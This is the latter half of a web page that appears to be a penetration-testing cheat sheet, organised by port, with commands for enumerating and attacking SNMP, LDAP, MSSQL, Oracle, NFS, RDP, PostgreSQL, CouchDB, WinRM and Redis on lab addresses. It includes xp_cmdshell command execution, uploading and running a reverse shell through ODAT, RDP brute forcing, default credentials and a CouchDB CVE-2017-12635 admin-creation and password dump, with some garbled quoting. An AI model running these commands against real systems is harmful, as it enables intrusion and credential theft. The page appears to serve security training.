+ auxiliary/scanner/snmp/epmp1000_snmp_loot
+ auxiliary/scanner/snmp/netopia_enum
+ auxiliary/scanner/snmp/sbg6580_enum
+ auxiliary/scanner/snmp/snmp_enum
+ auxiliary/scanner/snmp/snmp_enum_hp_laserjet
+ auxiliary/scanner/snmp/snmp_enumshares
+ auxiliary/scanner/snmp/snmp_enumusers
+ auxiliary/scanner/snmp/snmp_login
+</code></pre></div></div> <p><br></p> <h3 id="389636---ldap">389,636 - LDAP</h3> <hr> <p>Check <a href="../post-exploitation/windows/ad/">AD</a> section and this <a href="https://malicious.link/post/2022/ldapsearch-reference/" rel="external nofollow noopener" target="_blank">LDAP</a> guide</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jxplorer
+ldapsearch <span class="nt">-h</span> 10.11.1.111 <span class="nt">-p</span> 389 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"dc=mywebsite,dc=com"</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.182 <span class="nt">--users</span> <span class="nt">--full</span> <span class="o">&gt;</span> windapsearch_users.txt
+<span class="nb">cat </span>windapsearch_users.txt | <span class="nb">grep </span>sAMAccountName | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 2 <span class="o">&gt;</span> users.txt
+<span class="c"># Check # https://github.com/ropnop/go-windapsearch</span>
+</code></pre></div></div> <p><br></p> <h3 id="443---https">443 - HTTPS</h3> <hr> <p>Read the actual SSL CERT to:</p> <ul> <li>find out potential correct vhost to GET</li> <li>is the clock skewed</li> <li>any names that could be usernames for bruteforce/guessing.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./testssl.sh <span class="nt">-e</span> <span class="nt">-E</span> <span class="nt">-f</span> <span class="nt">-p</span>  <span class="nt">-S</span> <span class="nt">-P</span> <span class="nt">-c</span> <span class="nt">-H</span> <span class="nt">-U</span> TARGET-HOST <span class="o">&gt;</span> OUTPUT-FILE.html
+<span class="c"># Check for mod_ssl,OpenSSL version Openfuck</span>
+</code></pre></div></div> <p><br></p> <h3 id="500---isakmp-ike">500 - ISAKMP IKE</h3> <hr> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ike-scan 10.11.1.111
+</code></pre></div></div> <p><br></p> <h3 id="513---rlogin">513 - Rlogin</h3> <hr> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt install rsh-client
+rlogin -l root 10.11.1.111
+</code></pre></div></div> <p><br></p> <h3 id="541---fortinet-sslvpn">541 - FortiNet SSLVPN</h3> <hr> <p><a href="https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png" rel="external nofollow noopener" target="_blank">Fortinet Ports Guide</a></p> <p><br></p> <h3 id="1433---mssql">1433 - MSSQL</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 1433 <span class="nt">-sU</span> <span class="nt">--script</span><span class="o">=</span>ms-sql-info.nse 10.11.1.111
+use auxiliary/scanner/mssql/mssql_ping
+use auxiliary/scanner/mssql/mssql_login
+use exploit/windows/mssql/mssql_payload
+sqsh <span class="nt">-S</span> 10.11.1.111 <span class="nt">-U</span> sa
+    xp_cmdshell <span class="s1">'date'</span>
+      go
+
+
+EXEC sp_execute_external_script @language <span class="o">=</span> N<span class="s1">'Python'</span>, @script <span class="o">=</span> N<span class="s1">'import os;os.system("whoami")'</span>
+
+https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+</code></pre></div></div> <p><br></p> <h3 id="1521---oracle">1521 - Oracle</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oscanner <span class="nt">-s</span> 10.11.1.111 <span class="nt">-P</span> 1521
+tnscmd10g version <span class="nt">-h</span> 10.11.1.111
+tnscmd10g status <span class="nt">-h</span> 10.11.1.111
+nmap <span class="nt">-p</span> 1521 <span class="nt">-A</span> 10.11.1.111
+nmap <span class="nt">-p</span> 1521 <span class="nt">--script</span><span class="o">=</span>oracle-tns-version,oracle-sid-brute,oracle-brute
+MSF: good modules under auxiliary/admin/oracle and scanner/oracle
+
+<span class="c"># https://github.com/quentinhardy/odat</span>
+./odat-libc2.5-i686 all <span class="nt">-s</span> 10.11.1.111 <span class="nt">-p</span> 1521
+./odat-libc2.5-i686 sidguesser <span class="nt">-s</span> 10.11.1.111 <span class="nt">-p</span> 1521
+./odat-libc2.5-i686 passwordguesser <span class="nt">-s</span> 10.11.1.111 <span class="nt">-p</span> 1521 <span class="nt">-d</span> XE
+
+<span class="c"># Upload reverse shell with ODAT:</span>
+./odat-libc2.5-i686 utlfile <span class="nt">-s</span> 10.11.1.111 <span class="nt">-p</span> 1521 <span class="nt">-U</span> scott <span class="nt">-P</span> tiger <span class="nt">-d</span> XE <span class="nt">--sysdba</span> <span class="nt">--putFile</span> c:/ shell.exe /root/shell.exe
+
+<span class="c"># and run it:</span>
+./odat-libc2.5-i686 externaltable <span class="nt">-s</span> 10.11.1.111 <span class="nt">-p</span> 1521 <span class="nt">-U</span> scott <span class="nt">-P</span> tiger <span class="nt">-d</span> XE <span class="nt">--sysdba</span> <span class="nt">--exec</span> c:/ shell.exe
+</code></pre></div></div> <p><br></p> <h3 id="2000---cisco-sccp">2000 - Cisco sccp</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cisco-audit-tool</span>
+CAT <span class="nt">-h</span> ip <span class="nt">-p</span> 2000 <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt
+
+<span class="c"># cisco-smart-install</span>
+https://github.com/Sab0tag3d/SIET/
+<span class="nb">sudo </span>python siet.py <span class="nt">-g</span> <span class="nt">-i</span> 192.168.0.1
+</code></pre></div></div> <p><br></p> <h3 id="2049---nfs">2049 - NFS</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 111,2049 <span class="nt">--script</span> nfs-ls,nfs-showmount
+
+showmount <span class="nt">-e</span> 10.11.1.111
+
+<span class="c"># If you find anything you can mount it like this:</span>
+
+mount 10.11.1.111:/ /tmp/NFS –o nolock
+mount <span class="nt">-t</span> nfs 10.11.1.111:/ /tmp/NFS –o nolock
+</code></pre></div></div> <p><br></p> <h3 id="2100---oracle-xml-db">2100 - Oracle XML DB</h3> <hr> <p>Default passwords:</p> <p><a href="https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm" rel="external nofollow noopener" target="_blank">https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</a></p> <p><br></p> <h3 id="3306---mysql">3306 - MySQL</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span>mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 <span class="nt">-p</span> 3306
+
+mysql <span class="nt">--host</span><span class="o">=</span>10.11.1.111 <span class="nt">-u</span> root <span class="nt">-p</span>
+
+<span class="c"># MYSQL UDF 4.x/5.0</span>
+https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+</code></pre></div></div> <p><br></p> <h3 id="3389---rdp">3389 - RDP</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 3389 <span class="nt">--script</span><span class="o">=</span>rdp-vuln-ms12-020.nse
+rdesktop <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-g</span> 85% <span class="nt">-r</span> disk:share<span class="o">=</span>/root/ 10.11.1.111
+rdesktop <span class="nt">-u</span> guest <span class="nt">-p</span> guest 10.11.1.111 <span class="nt">-g</span> 94%
+ncrack <span class="nt">-vv</span> <span class="nt">--user</span> Administrator <span class="nt">-P</span> /root/oscp/passwords.txt rdp://10.11.1.111
+python crowbar.py <span class="nt">-b</span> rdp <span class="nt">-s</span> 10.11.1.111/32 <span class="nt">-u</span> admin <span class="nt">-C</span> ../rockyou.txt <span class="nt">-v</span>
+</code></pre></div></div> <p><br></p> <h3 id="5432---postgresql">5432 - PostgreSQL</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="nt">-h</span> 10.10.1.111 <span class="nt">-U</span> postgres <span class="nt">-W</span>
+
+<span class="c"># Default creds</span>
+postgres : postgres
+postgres : password
+postgres : admin
+admin : admin
+admin : password
+
+pg_dump <span class="nt">--host</span><span class="o">=</span>10.10.1.111 <span class="nt">--username</span><span class="o">=</span>postgres <span class="nt">--password</span> <span class="nt">--dbname</span><span class="o">=</span>template1 <span class="nt">--table</span><span class="o">=</span><span class="s1">'users'</span> <span class="nt">-f</span> output_pgdump
+</code></pre></div></div> <p><br></p> <h3 id="5900---vnc">5900 - VNC</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span>vnc-info,vnc-brute,vnc-title <span class="nt">-p</span> 5900 10.11.1.111
+</code></pre></div></div> <p><br></p> <h3 id="5984---couchdb">5984 - CouchDB</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://example.com:5984/
+curl <span class="nt">-X</span> GET http://IP:5984/_all_dbs
+curl <span class="nt">-X</span> GET http://user:password@IP:5984/_all_dbs
+
+<span class="c"># CVE-2017-12635 RCE</span>
+
+<span class="c"># Create user</span>
+curl <span class="nt">-X</span> PUT ‘http://localhost:5984/_users/org.couchdb.user:chenny<span class="s1">' — data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’
+
+# Dump database
+curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword &lt;ds/_all_docs?include_docs=true -u chenny:-Xpassword
+
+# Dump passwords
+curl -X GET http://user:passwords@localhost:5984/passwords
+</span></code></pre></div></div> <p><br></p> <h3 id="5985---winrm">5985 - WinRM</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://github.com/Hackplayers/evil-winrm</span>
+gem <span class="nb">install </span>evil-winrm
+evil-winrm <span class="nt">-i</span> 10.11.1.111 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'password1'</span>
+evil-winrm <span class="nt">-i</span> 10.11.1.111 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="s1">'hash-pass'</span> <span class="nt">-s</span> /scripts/folder
+</code></pre></div></div> <p><br></p> <h3 id="6379---redis">6379 - Redis</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://github.com/Avinash-acid/Redis-Server-Exploit</span>
+python redis.py 10.10.10.160 redis
+</code></pre></div></div> <p><br></p> <h3 id="8172---msdeploy">8172 - MsDeploy</h3> <hr> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Microsoft IIS Deploy port</span>
+IP:8172/msdeploy.axd
+</code></pre></div></div> <p><br></p> <h3 id="56019200">5601/9200</h3> <hr> <p><a href="webservices/elk.md">ELK</a></p> <p><br></p> <h3 id="27017-192708028017---mongodb">27017-19/27080/28017 - MongoDB</h3> <hr> <p><a href="webservices/nosql-and-and-mongodb.md">MongoDB</a></p> <h2 id="unknown-ports">Unknown ports</h2> <hr> <ul> <li><code class="language-plaintext highlighter-rouge">amap -d 10.11.1.111 8000</code></li> <li>netcat: makes connections to ports. Can echo strings or give shells: <code class="language-plaintext highlighter-rouge">nc -nv 10.11.1.111 110</code> </li> <li>sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, using basic HTTP configurations</li> </ul> <h2 id="rce-ports">RCE ports</h2> <hr> <p><img src="../.gitbook/assets/image%20(1).png" alt=""></p> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> -[47z!Lu7h] -[Love is life. And if you miss love, you miss life]-[2025]- <a href="https://atz1luth.github.ioLove%20is%20life.%20And%20if%20you%20miss%20love,%20you%20miss%20life.%0A"></a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Digite para iniciar a busca"> <div class="modal-footer" slot="footer"> <span class="help"> <svg version="1.0" class="ninja-examplekey" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1280 1280"> <path d="M1013 376c0 73.4-.4 113.3-1.1 120.2a159.9 159.9 0 0 1-90.2 127.3c-20 9.6-36.7 14-59.2 15.5-7.1.5-121.9.9-255 1h-242l95.5-95.5 95.5-95.5-38.3-38.2-38.2-38.3-160 160c-88 88-160 160.4-160 161 0 .6 72 73 160 161l160 160 38.2-38.3 38.3-38.2-95.5-95.5-95.5-95.5h251.1c252.9 0 259.8-.1 281.4-3.6 72.1-11.8 136.9-54.1 178.5-116.4 8.6-12.9 22.6-40.5 28-55.4 4.4-12 10.7-36.1 13.1-50.6 1.6-9.6 1.8-21 2.1-132.8l.4-122.2H1013v110z"></path> </svg> para selecionar </span> <span class="help"> <svg xmlns="http://www.w3.org/2000/svg" class="ninja-examplekey" viewbox="0 0 24 24"> <path d="M0 0h24v24H0V0z" fill="none"></path> <path d="M20 12l-1.41-1.41L13 16.17V4h-2v12.17l-5.58-5.59L4 12l8 8 8-8z"></path> </svg> <svg xmlns="http://www.w3.org/2000/svg" class="ninja-examplekey" viewbox="0 0 24 24"> <path d="M0 0h24v24H0V0z" fill="none"></path> <path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z"></path> </svg> para navegar </span> <span class="help"> <span class="ninja-examplekey esc">esc</span> para cerrar </span> <span class="help"> <svg xmlns="http://www.w3.org/2000/svg" class="ninja-examplekey backspace" viewbox="0 0 20 20" fill="currentColor"> <path fill-rule="evenodd" d="M6.707 4.879A3 3 0 018.828 4H15a3 3 0 013 3v6a3 3 0 01-3 3H8.828a3 3 0 01-2.12-.879l-4.415-4.414a1 1 0 010-1.414l4.414-4.414zm4 2.414a1 1 0 00-1.414 1.414L10.586 10l-1.293 1.293a1 1 0 101.414 1.414L12 11.414l1.293 1.293a1 1 0 001.414-1.414L13.414 10l1.293-1.293a1 1 0 00-1.414-1.414L12 8.586l-1.293-1.293z" clip-rule="evenodd"></path> </svg> subir un nivel </span> </div> </ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/es/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>
